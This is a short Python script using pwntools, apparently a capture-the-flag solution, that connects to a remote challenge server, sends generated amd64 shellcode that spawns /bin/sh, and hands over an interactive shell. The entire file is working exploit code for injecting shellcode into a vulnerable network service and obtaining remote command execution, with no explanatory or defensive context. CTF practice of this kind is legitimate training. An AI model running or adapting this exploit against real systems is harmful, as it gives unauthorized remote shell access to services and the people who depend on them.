from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')
io = remote('redirect.do-not-trust.hacking.run', 10024)
io.sendline(asm(shellcraft.sh()))
io.interactive()